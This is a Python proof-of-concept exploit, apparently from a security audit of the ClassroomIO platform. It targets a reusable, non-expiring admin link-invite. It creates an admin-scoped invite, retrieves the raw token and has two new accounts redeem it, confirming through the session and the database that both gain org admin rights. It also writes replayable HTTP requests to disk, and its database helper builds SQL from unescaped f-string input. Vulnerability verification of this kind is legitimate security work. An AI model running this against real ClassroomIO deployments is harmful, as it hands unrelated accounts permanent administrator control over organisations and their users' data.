#!/usr/bin/env python3
"""
VULN-017 (AC-4) — Reusable, non-expiring ADMIN link-invite → any account becomes
permanent org admin.

Vulnerable code (targets/classroomio/):
  * create: apps/api/src/services/organization/invite.ts:519-550 (getOrCreateLinkInvite)
            — permits roleId=ADMIN, expiry = Date.now()+100y, stores the RAW token
              in metadata.token.
  * fetch:  apps/api/src/routes/organization/organization.ts:209-217
            (GET /organization/link-invite → fetchOrgLinkInvite returns metadata.token raw)
  * accept: apps/api/src/services/organization/invite.ts:609-638 (acceptLinkInvite)
            — checks ONLY row.invite.isRevoked (no expiry, NOT consumed → reusable),
              then syncOrgMemberForOrgInvite grants row.invite.roleId (ADMIN).

Class: CWE-284 / CWE-522 broken access control — privilege escalation by mere
possession of a long-lived, reusable, admin-scoped, cleartext-disclosed token.

The flaw: a single "join by link" invite can be created for the ADMIN role, lives
~100 years, exposes its raw token via the admin GET route, and is never consumed on
accept (only revocation is checked). Anyone who obtains the URL becomes a permanent
org ADMIN, and the same token works for an unlimited number of accounts.

Exploitation idea: admin creates an ADMIN link-invite; the raw token is retrievable;
two independent freshly-signed-up accounts each POST /invite/link/<token>/accept and
both become org ADMIN (role_id=1) — proven via the app session (orgRoles) AND the DB
(organizationmember.role_id) as ground truth.

Success proves: possession of one leaked link permanently escalates arbitrary,
unrelated accounts to organization administrator, and the token is reusable.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    admin_login, signup, log, banner, verdict, rid, psql, ROLE, ORG_ID, API,
)

VULN = "VULN-017"
HERE = os.path.dirname(os.path.abspath(__file__))


def db_role(email: str):
    """Ground-truth org role for `email` straight from the DB (or None)."""
    out = psql(
        f"SELECT role_id FROM organizationmember "
        f"WHERE lower(email)=lower('{email}') AND organization_id='{ORG_ID}';"
    )
    if out is None or out.strip() == "":
        return None
    return int(out.splitlines()[0].strip())


def redeem_as_new_user(token: str, label: str):
    """Fresh signup, then accept the ADMIN link invite. Returns (client, info)."""
    victim = signup(label=label)
    r = victim.post(f"/invite/link/{token}/accept", json={})
    log("STEP", f"  {label} POST /invite/link/<token>/accept → HTTP {r.status_code} {r.text[:160]}")
    roles = victim.org_roles()
    return victim, {
        "email": victim.email,
        "status": r.status_code,
        "session_role": roles.get(ORG_ID),
        "db_role": db_role(victim.email),
    }


def main():
    banner(VULN, "Reusable, non-expiring ADMIN link-invite → permanent org takeover")
    admin = admin_login()
    log("SETUP", f"admin session established (user={admin.user.get('id') if admin.user else None})")

    # (1) Create an ADMIN (roleId=1) link invite. getOrCreateLinkInvite is get-or-create;
    #     assert we actually hold an ADMIN-scoped invite.
    log("STEP", "POST /organization/link-invite {\"roleId\":1}  (request the ADMIN role)")
    r = admin.post("/organization/link-invite", org=True, json={"roleId": ROLE["ADMIN"]})
    if r.status_code != 200:
        verdict(VULN, "FAILED", f"link-invite create returned {r.status_code}: {r.text[:200]}")
        sys.exit(1)
    created = r.json().get("data", {})
    token = created.get("token")
    role_created = created.get("roleId")
    log("INFO", f"  create response: roleId={role_created} isRevoked={created.get('isRevoked')} token={token!r}")

    if role_created != ROLE["ADMIN"]:
        # A pre-existing non-ADMIN link invite was returned (get-or-create). The ADMIN
        # capability is a code fact, but we cannot show it live without disturbing state.
        verdict(VULN, "NEEDS_MANUAL",
                f"org already has a roleId={role_created} link invite; ADMIN branch unexercised live")
        sys.exit(1)

    if created.get("isRevoked"):
        log("STEP", "invite is revoked — re-enabling via PATCH so accept can proceed")
        admin.patch("/organization/link-invite", org=True, json={"isRevoked": False})

    # (2) The admin GET route hands back the RAW token (cleartext disclosure).
    g = admin.get("/organization/link-invite", org=True)
    fetched = (g.json() or {}).get("data") or {}
    log("STEP", f"GET /organization/link-invite → raw token disclosed: {fetched.get('token')!r}")
    raw_disclosed = fetched.get("token") == token and bool(token)
    if raw_disclosed:
        log("PROOF", "GET /organization/link-invite returns the RAW admin-invite token (cleartext)")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            f"### VULN-017 — create + fetch + reuse an ADMIN link-invite\n"
            f"POST {API}/organization/link-invite HTTP/1.1\n"
            f"cio-org-id: {ORG_ID}\nContent-Type: application/json\n"
            f"Cookie: classroomio.session_token=<ADMIN>\n\n"
            f'{{"roleId":1}}\n\n'
            f"### decisive: any fresh account redeems the returned token\n"
            f"POST {API}/invite/link/{token}/accept HTTP/1.1\n"
            f"Cookie: classroomio.session_token=<ANY_FRESH_ACCOUNT>\n\n{{}}\n"
        )

    # (3) Two independent fresh accounts redeem the same token → both become ADMIN.
    log("STEP", "fresh account #1 redeems the ADMIN link")
    u1, i1 = redeem_as_new_user(token, f"victim1_{rid()}")
    log("INFO", f"  #1 {i1['email']}: session_role={i1['session_role']} db_role={i1['db_role']}")

    log("STEP", "fresh account #2 redeems the SAME token (reuse)")
    u2, i2 = redeem_as_new_user(token, f"victim2_{rid()}")
    log("INFO", f"  #2 {i2['email']}: session_role={i2['session_role']} db_role={i2['db_role']}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("GET /organization/link-invite (admin) → data:\n")
        f.write(str(fetched) + "\n\n")
        f.write(f"Account #1 {i1['email']}: accept HTTP {i1['status']}, "
                f"session orgRoles[{ORG_ID}]={i1['session_role']}, DB role_id={i1['db_role']}\n")
        f.write(f"Account #2 {i2['email']}: accept HTTP {i2['status']}, "
                f"session orgRoles[{ORG_ID}]={i2['session_role']}, DB role_id={i2['db_role']}\n")
        f.write("(ROLE.ADMIN == 1)\n")

    a = ROLE["ADMIN"]
    u1_admin = i1["session_role"] == a and i1["db_role"] == a
    u2_admin = i2["session_role"] == a and i2["db_role"] == a

    if u1_admin:
        log("PROOF", f"account #1 is now org ADMIN (session & DB role_id=1) via a leaked link, no prior privilege")
    if u2_admin:
        log("PROOF", f"account #2 ALSO became ADMIN with the SAME token → invite is reusable / not consumed")

    if raw_disclosed and u1_admin and u2_admin:
        verdict(VULN, "CONFIRMED",
                "ADMIN link-invite discloses its raw token and reusably grants org ADMIN to any account")
        log("OK", "confirmed — durable, reusable, cleartext, admin-scoped invite = permanent org takeover")
        sys.exit(0)

    verdict(VULN, "FAILED",
            f"raw_disclosed={raw_disclosed} u1_admin={u1_admin} u2_admin={u2_admin}")
    sys.exit(1)


if __name__ == "__main__":
    main()
